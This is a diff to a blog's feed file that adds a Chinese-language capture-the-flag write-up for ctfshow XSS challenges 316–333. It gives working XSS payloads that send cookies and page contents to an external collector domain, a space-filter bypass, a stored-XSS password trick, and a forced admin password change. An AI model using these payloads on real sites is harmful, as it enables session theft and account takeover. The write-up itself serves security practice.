@@ -4,6 +4,37 @@
   
     
     <entry>
+      <title>ctfshow_web入门（XSS316-333）</title>
+      <link href="/2023/01/21/ctfshow_web%E5%85%A5%E9%97%A8%20XSS316-333/"/>
+      <url>/2023/01/21/ctfshow_web%E5%85%A5%E9%97%A8%20XSS316-333/</url>
+      
+        <content type="html"><![CDATA[<span id="more"></span><h1 id="ctfshow-web入门（XSS316-333）"><a href="#ctfshow-web入门（XSS316-333）" class="headerlink" title="ctfshow_web入门（XSS316-333）"></a>ctfshow_web入门（XSS316-333）</h1><h2 id="web316"><a href="#web316" class="headerlink" title="web316"></a>web316</h2><p>首先测试一下<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，弹窗成功，第一题应该是没有任何的过滤，所以直接打cookie即可。</p><p><code>(http://0b09753a-c2ba-4f51-a473-5963469fefd9.challenge.ctf.show/?msg=&quot;%2F&gt;&lt;%2FsCrIpT&gt;)</code></p><p>![image-20230120174942937](ctfshow_web入门 XSS316-333\image-20230120174942937.png)</p><p>ctfshow%7B4c1b8648-a21f-4c11-9b3a-6b271854b062%7D</p><h2 id="web317"><a href="#web317" class="headerlink" title="web317"></a>web317</h2><p><a href="http://ceye.io/">CEYE - Monitor service for security testing</a></p><p>在这个网站上注册账号获得一个临时域名，rqfl57.ceye.io</p><p>![image-20230120193601863](ctfshow_web入门 XSS316-333&#x2F;image-20230120193601863.png)</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;window.open(&#x27;http://rqfl57.ceye.io/&#x27;+document.cookie)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>![image-20230120194114609](ctfshow_web入门 XSS316-333&#x2F;image-20230120194114609.png)</p><p>![image-20230120194146461](ctfshow_web入门 XSS316-333&#x2F;image-20230120194146461.png)</p><p>web318、web319都可以用这个方法</p><h2 id="web320"><a href="#web320" class="headerlink" title="web320"></a>web320</h2><p>使用<body>方法没反应，好像过滤了空格，把空格换成&#x2F;**&#x2F;</body></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/**/onload=&quot;window.open(&#x27;http://rqfl57.ceye.io/&#x27;+document.cookie)&quot;&gt;</span><br></pre></td></tr></table></figure><p>![image-20230120195110683](ctfshow_web入门 XSS316-333&#x2F;image-20230120195110683.png)</p><p>web321—326也一样</p><h2 id="web327"><a href="#web327" class="headerlink" title="web327"></a>web327</h2><p>![image-20230120200542603](ctfshow_web入门 XSS316-333&#x2F;image-20230120200542603.png)</p><p>![image-20230120200607062](ctfshow_web入门 XSS316-333&#x2F;image-20230120200607062.png)</p><p>![image-20230120200625276](ctfshow_web入门 XSS316-333&#x2F;image-20230120200625276.png)</p><h2 id="web328"><a href="#web328" class="headerlink" title="web328"></a>web328</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注册账户，将密码设置为：&lt;script&gt;window.open(&#x27;http://rqfl57.ceye.io/&#x27;+document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>![image-20230120201041962](ctfshow_web入门 XSS316-333&#x2F;image-20230120201041962.png)</p><p>获得管理员cookie，F12，把cookie改成管理员的就好啦。</p><p>![image-20230120201341837](ctfshow_web入门 XSS316-333&#x2F;image-20230120201341837.png)</p><p>![image-20230120201415999](ctfshow_web入门 XSS316-333&#x2F;image-20230120201415999.png)</p><h2 id="web329"><a href="#web329" class="headerlink" title="web329"></a>web329</h2><p>使用与上题一样的方法后发现，cookie失效了，表格会出现在第一行的右侧，直接拿flag就好了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.open(&#x27;http://rqfl57.ceye.io/&#x27;+document.getElementsByClassName(&#x27;layui-table-cell laytable-cell-1-0-1&#x27;)[1].innerHTML)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>![image-20230120204406537](ctfshow_web入门 XSS316-333&#x2F;image-20230120204406537.png)</p><h2 id="web330"><a href="#web330" class="headerlink" title="web330"></a>web330</h2><p>和上题一样，就是位置变了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.open(&#x27;//rqfl57.ceye.io/&#x27;+document.querySelector(&#x27;#top &gt; div.layui-container&#x27;).textContent)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>![image-20230120211520672](ctfshow_web入门 XSS316-333&#x2F;image-20230120211520672.png)</p><h2 id="web331"><a href="#web331" class="headerlink" title="web331"></a>web331</h2><p>让admin自己修改自己密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$.ajax(&#123;url:&#x27;api/change.php&#x27;,type:&#x27;post&#x27;,data:&#123;p:&#x27;123&#x27;&#125;&#125;);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>![image-20230120213131564](ctfshow_web入门 XSS316-333&#x2F;image-20230120213131564.png)</p><h2 id="web332"><a href="#web332" class="headerlink" title="web332"></a>web332</h2><p>![image-20230120213353090](ctfshow_web入门 XSS316-333&#x2F;image-20230120213353090.png)</p><p>flag需要9999元，转负数的钱就能给自己加钱，所以给admin转-9999哈哈哈</p><p>![image-20230120213537690](ctfshow_web入门 XSS316-333&#x2F;image-20230120213537690.png)</p><h2 id="web333"><a href="#web333" class="headerlink" title="web333"></a>web333</h2><p>不能转负数了，但是可以给自己转钱</p><p>![image-20230120214004808](ctfshow_web入门 XSS316-333&#x2F;image-20230120214004808.png)</p><p>使用burp</p><p>![image-20230120220322650](ctfshow_web入门 XSS316-333&#x2F;image-20230120220322650.png)</p><p>![image-20230120220345095](ctfshow_web入门 XSS316-333&#x2F;image-20230120220345095.png)</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> ctf </category>
+          
+          <category> web </category>
+          
+          <category> XSS </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CTF </tag>
+            
+            <tag> web安全 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>ctfshow-web入门-sql注入（184-189）</title>
       <link href="/2023/01/20/ctfshow-web184~189/"/>
       <url>/2023/01/20/ctfshow-web184~189/</url>
